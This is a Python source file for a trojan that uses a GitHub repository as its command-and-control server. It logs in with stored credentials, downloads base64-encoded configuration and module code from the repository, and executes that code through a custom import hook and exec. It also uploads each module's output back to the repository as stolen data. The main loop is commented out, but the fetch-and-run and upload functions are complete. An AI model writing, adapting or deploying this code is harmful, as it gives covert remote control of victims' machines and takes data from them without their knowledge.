import base64
import imp
import inspect
import json
import os
import random
import sys
import threading
import time
import queue

from cryptography import *
from git import cmd
from github3 import login


# Get account data and public key
with open('config/keys.json') as json_data:
	account_data = json.load(json_data)[0]

u_branch = account_data['branch']
u_name   = account_data['username']
u_pass   = account_data['password']
u_repo   = account_data['repository']
key      = account_data['cipher_key']


# Init main variables
trojan_id     = "abc"
trojan_config_path = "config/{0}.json".format(trojan_id)
trojan_data_path     = "data/{0}/".format(trojan_id)
trojan_modules = []

configured = False
task_queue = queue.Queue()


def connect_to_github():
	gh = login(username=u_name, password=u_pass)
	repo = gh.repository(u_name, u_repo)
	branch = repo.branch(u_branch)

	return gh, repo, branch


def get_file_contents(filepath, f=None):

	gh, repo, branch = connect_to_github()

	# initialize remote tree
	tree = branch.commit.commit.tree.recurse()

	# loop trough tree array
	for filename in tree.tree:

		# find filepath in tree object
		if filepath in filename.path:
			print("[*] Found remote file {0}".format(filepath))
			blob = repo.blob(filename._json_data['sha'])

			if f == 'b':
				return blob
			else:
				return blob.content

	return None

def compare_local_config(config_path):
	"""
		Compares local config with github
		Updates changes

		TODO:
	"""

	local_config = None
	try:
		local_config = open(config_path)
		local_config = json.load(local_config)
	except (json.decoder.JSONDecodeError, FileNotFoundError):
		print('JSON corrupted in %s' % inspect.stack()[0][3])

	remote_blob = get_file_contents(config_path, 'b')

	if not remote_blob:
		print("[!] Can't find config file!")
		print('[=] Exiting.')

		return None

	try:
		remote_config = json.loads(base64.b64decode(remote_blob.content))
	except json.decoder.JSONDecodeError:
		print("[!] Remote json corrupted!")
		print("[=] Exiting.")

		return None

	if local_config != remote_config:
		print('[+] Updating local config file...')

		with open(config_path, 'w') as local_config:
			json.dump(remote_config, local_config)

		print("[=] Exiting.")

	return None


def get_trojan_config(config_path):
	"""
		Get local config
		And return active modules

		TODO:
	"""

	global configured

	# b64 encoded string
	config_b64 = get_file_contents(config_path)
	# parse b64 string and return array of python dictionaries
	config = json.loads(base64.b64decode(config_b64))
	configured = True
	print(config)

	for task in config:
		if task["isActive"]:
			if task["module"] not in sys.modules:
				exec("import {0}".format(task["module"]))

	return config

get_trojan_config(trojan_config_path)


def store_module_result(data, module):

	gh, repo, branch = connect_to_github()
	remote_path = "data/%s/%s_%d.data" % (trojan_id, module, random.randint(1000, 100000))
	repo.create_file(remote_path, "Retrieved data", data)

	return


class GitImporter(object):
	def __init__(self):
		self.current_module_code = ""

	def find_module(self, fullname, path=None):
		if configured:
			print("[*] Attempting to retrieve %s" % fullname)
			new_library = get_file_contents("modules/%s" % fullname)

			if new_library is not None:
				self.current_module_code = base64.b64decode(new_library)
				return self

		return None

	def load_module(self, name):

		module = imp.new_module(name)
		exec(self.current_module_code) in module.__dict__
		sys.modules[name] = module

		return module


def module_runner(module):

	task_queue.put(1)
	result = sys.modules[module].run()
	task_queue.get()

	# store the result in repo
	store_module_result(result, module)

	return


# main trojan loop
#sys.meta_path = [GitImporter()]

# while True:

# 	if task_queue.empty():
# 		print("")

#		compare_local_config(trojan_config_path)
# 		config = get_trojan_config(trojan_config_path)

# 		for task in config:
# 			t = threading.Thread(target=module_runner, args=(task['module']))
# 			t.start()
# 			time.sleep(random.randint(1, 5))

# 	time.sleep(random.randint(1000, 5000))
